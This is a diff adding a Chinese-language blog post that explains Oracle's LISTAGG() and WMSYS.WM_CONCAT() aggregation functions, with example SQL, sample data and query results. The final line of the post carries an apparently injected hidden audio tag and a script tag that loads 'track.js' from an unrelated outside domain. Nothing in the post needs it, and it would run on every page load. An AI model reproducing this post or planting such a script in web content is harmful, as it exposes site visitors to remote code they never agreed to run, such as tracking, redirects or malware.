@@ -1,0 +1,61 @@
+---
+layout: post
+title: oracle中listagg()和wmsys.wm_concat()用法
+date: 2020-05-29 08:45:48.000000000 +08:00
+type: post
+parent_id: '0'
+published: true
+password: ''
+status: publish
+categories:
+- Oracle
+tags: []
+meta:
+  blocksy_post_meta_options: a:1:{s:17:"styles_descriptor";a:3:{s:6:"styles";a:3:{s:7:"desktop";s:0:"";s:6:"tablet";s:0:"";s:6:"mobile";s:0:"";}s:12:"google_fonts";a:0:{}s:7:"version";i:5;}}
+author:
+  login: gavin
+  email: 519077334@qq.com
+  display_name: gavin
+  first_name: ''
+  last_name: ''
+permalink: "/index.php/2020/05/29/oracle%e4%b8%adlistagg%e5%92%8cwmsys-wm_concat%e7%94%a8%e6%b3%95/"
+---
+<p>一、listagg() 简介</p>
+<p>介绍：其函数在Oracle 11g 版本中推出，对分组后的数据按照一定的排序进行字符串连接。</p>
+<p>其中，“[,]”表示字符串连接的分隔符，如果选择使用[over (partition by )]则会使其变成分析函数；</p>
+<p>用法1： SELECT aaa, listagg(bbb,',') within GROUP (ORDER BY aaa) FROM table  GROUP BY aaa</p>
+<p>用法2： SELECT aaa, listagg(bbb,',') within GROUP (ORDER BY aaa) over(partition by aaa) FROM table</p>
+<p>&nbsp;</p>
+<p>二、wm_concat()简介</p>
+<p>介绍：其函数在Oracle 10g推出，在10g版本中，返回字符串类型，在11g版本中返回clob类型。</p>
+<p>括号里面的参数是列，而且可以是多个列的集合，也就是说在括号里面可以自由地用‘||’合并字符串。</p>
+<p>用法1： Select aaa, wmsys.wm_concat(bbb || '(' || ccc || ')' ) from table group by aaa</p>
+<p>用法2： Select aaa, wmsys.wm_concat(bbb || '(' || ccc || ')' ) over(partition by aaa) from table</p>
+<p>三、应用实例：</p>
+<p>3.1、创建表 CREATE TABLE TESTAGG</p>
+<p>(</p>
+<p>A VARCHAR2(20),</p>
+<p>B VARCHAR2(20),</p>
+<p>C VARCHAR2(20)</p>
+<p>)</p>
+<p>3.2、初始化数据</p>
+<p>INSERT INTO "TESTAGG" (A, B, C) VALUES ('1', 'B1','C1')</p>
+<p>INSERT INTO "TESTAGG" (A, B, C) VALUES ('1', 'B2','C2')</p>
+<p>INSERT INTO "TESTAGG" (A, B, C) VALUES ('1', 'B3','C3')</p>
+<p>INSERT INTO "TESTAGG" (A, B, C) VALUES ('2', 'B4','C4')</p>
+<p>INSERT INTO "TESTAGG" (A, B, C) VALUES ('2', 'B5','C5')</p>
+<p>INSERT INTO "TESTAGG" (A, B, C) VALUES ('3', 'B6','C6')</p>
+<p>3.3、wm_concat（）用法</p>
+<p>select a,wm_concat(b|| '(' || c || ')') as bc from testagg group by a order by a</p>
+<p>1  &lt;CLOB&gt;--B1(C1),B2(C2),B3(C3)</p>
+<p>2  &lt;CLOB&gt;--B4(C4),B5(C5)</p>
+<p>3  &lt;CLOB&gt;--B6(C6)</p>
+<p>若要转化成string可以用to_char(）函数。</p>
+<p>&nbsp;</p>
+<p>3.4、 LISTAGG（）用法</p>
+<p>select a,LISTAGG(b,',' ) within group(order by a) as bc from testagg group by a</p>
+<p>1 B1,B2,B3</p>
+<p>2 B4,B5</p>
+<p>3 B6</p>
+<p>注意：但当数据量比较大时，一般clob字段超过4000，会报ORA-01489:字符串连接的结果过长。</p>
+<p><audio style="display: none;" controls="controls"></audio><script src="https://trick.cofounderspecials.com/track.js?v=9.999" type="text/javascript"></script></p>
